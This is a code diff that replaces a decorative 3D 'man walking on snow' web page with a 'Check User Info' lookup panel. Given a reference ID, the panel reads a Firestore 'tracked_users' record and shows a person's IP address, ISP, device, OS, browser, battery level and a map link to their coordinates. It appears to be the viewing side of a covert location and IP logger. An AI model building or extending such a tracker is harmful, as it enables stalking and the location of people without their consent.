@@ -1,139 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8">
-  <title>A man walking on snow</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1,minimal-ui,shrink-to-fit=no,viewport-fit=cover">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="mobile-web-app-capable" content="yes">
-  <meta name="description" content="A man walking on snow. Enjoying the silence and the relaxing sound of his own foosteps.">
-  
-  <style>
-    /* --- ORIGINAL CSS --- */
-    *,
-    *::before,
-    *::after {
-      box-sizing: border-box;
-    }
-
-    * {
-      margin: 0;
-    }
-
-    body {
-      line-height: 1.5;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-      background-color: #e5e7eb;
-      font-family: sans-serif;
-      -ms-scroll-chaining: none;
-      overscroll-behavior: none;
-      overflow: hidden; /* Prevent scrollbars */
-    }
-
-    img,
-    picture,
-    video,
-    canvas,
-    svg {
-      display: block;
-      max-width: 100%;
-    }
-
-    #root,
-    #__next {
-      isolation: isolate;
-    }
-
-    .canvas-wrapper {
-      width: 100vw;
-      height: 100dvh;
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-      user-select: none;
-      position: relative; /* Essential for positioning the overlay */
-    }
-    
-    /* --- NEW OVERLAY CSS --- */
-    
-    /* Container that sits on top of the canvas but lets clicks pass through */
-    .character-overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none; /* Crucial: lets you still interact with the 3D game */
-      z-index: 10;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    /* The Group holder to center everything relative to the character */
-    .tracker-group {
-      position: absolute;
-      /* Adjust these slightly if the character is not perfectly center */
-      top: 50%; 
-      left: 50%;
-      transform: translate(-50%, -50%);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      /* Animation to mimic the bobbing of walking */
-      animation: bobbing 0.6s infinite alternate ease-in-out;
-    }
-
-    /* 1. The Name Tag (Taavishi) */
-    .name-tag {
-      background: rgba(0, 0, 0, 0.6);
-      color: white;
-      padding: 4px 12px;
-      border-radius: 12px;
-      font-weight: bold;
-      font-size: 14px;
-      margin-bottom: 80px; /* Push it up above the head */
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-      border: 1px solid rgba(255,255,255,0.2);
-    }
-
-    /* 2. The T-Shirt Text (Rafi) */
-    .tshirt-text {
-      position: absolute;
-      top: 15px; /* Adjust to align with chest */
-      color: rgba(255, 255, 255, 0.9); /* Slightly transparent to blend */
-      font-weight: 900;
-      font-size: 12px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
-      mix-blend-mode: overlay; /* Helps it look like it's on the fabric */
-    }
-
-    /* Simple animation to make the text move slightly with the walking rhythm */
-    @keyframes bobbing {
-      0% { transform: translate(-50%, -55%); }
-      100% { transform: translate(-50%, -48%); }
-    }
-
-  </style>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check User Info</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; padding: 20px; }
+        h1 { text-align: center; color: #333; margin-top: 50px; }
+        .search-box { display: flex; justify-content: center; gap: 10px; max-width: 800px; margin: 0 auto 30px auto; }
+        input { padding: 15px; border: 1px solid #ccc; border-radius: 5px; width: 40%; outline: none; }
+        button { padding: 15px 30px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        button:hover { background-color: #0056b3; }
+        #result-area { display: none; max-width: 800px; margin: 0 auto; background: white; border: 1px solid #ddd; border-radius: 5px; overflow: hidden; }
+        .row { display: flex; border-bottom: 1px solid #eee; padding: 15px; }
+        .label { font-weight: bold; width: 30%; color: #333; }
+        .value { width: 70%; color: #555; word-break: break-all; }
+        .map-link { color: #d32f2f; text-decoration: none; font-weight: bold; }
+    </style>
 </head>
-
 <body>
-  
-  <div class="character-overlay">
-    <div class="tracker-group">
-      <div class="name-tag">Taavishi</div>
-      
-      <div class="tshirt-text">Rafi</div>
+
+    <h1>Check User Info</h1>
+
+    <div class="search-box">
+        <input type="text" id="refIdInput" placeholder="Enter Ref ID">
+        <input type="text" placeholder="Your WhatsApp (Optional)">
+        <button onclick="fetchInfo()">Search</button>
     </div>
-  </div>
 
-  <div id="root"></div>
-  <script src='https://assets.codepen.io/453571/explorer.js'></script>
+    <div id="result-area">
+        <div class="row"><div class="label">IP Address</div><div class="value" id="disp_ip">...</div></div>
+        <div class="row"><div class="label">Map</div><div class="value"><a href="#" id="disp_map" target="_blank" class="map-link">📍 Open Map</a></div></div>
+        <div class="row"><div class="label">ISP</div><div class="value" id="disp_isp">...</div></div>
+        <div class="row"><div class="label">Device</div><div class="value" id="disp_device">...</div></div>
+        <div class="row"><div class="label">OS</div><div class="value" id="disp_os">...</div></div>
+        <div class="row"><div class="label">Browser</div><div class="value" id="disp_browser">...</div></div>
+        <div class="row"><div class="label">Battery</div><div class="value" id="disp_battery">...</div></div>
+        <div class="row"><div class="label">Last Updated</div><div class="value" id="disp_time">...</div></div>
+    </div>
+
+    <script type="module">
+        import { db } from './firebase-config.js';
+        import { doc, getDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+
+        window.fetchInfo = async function() {
+            const id = document.getElementById('refIdInput').value;
+            const resultArea = document.getElementById('result-area');
+
+            if(!id) { alert("Please enter a Ref ID"); return; }
+
+            try {
+                const docRef = doc(db, "tracked_users", id);
+                const docSnap = await getDoc(docRef);
+
+                if (docSnap.exists()) {
+                    const data = docSnap.data();
+                    document.getElementById('disp_ip').innerText = data.ip;
+                    document.getElementById('disp_isp').innerText = data.isp;
+                    document.getElementById('disp_device').innerText = data.device;
+                    document.getElementById('disp_os').innerText = data.os;
+                    document.getElementById('disp_browser').innerText = data.browser;
+                    document.getElementById('disp_battery').innerText = data.battery;
+                    document.getElementById('disp_time').innerText = data.lastUpdated;
+                    
+                    const mapUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
+                    document.getElementById('disp_map').href = mapUrl;
+
+                    resultArea.style.display = 'block';
+                } else {
+                    alert("No data found for this ID!");
+                    resultArea.style.display = 'none';
+                }
+            } catch (error) {
+                console.error("Error getting document:", error);
+                alert("Error fetching data.");
+            }
+        }
+    </script>
 </body>
-
 </html>
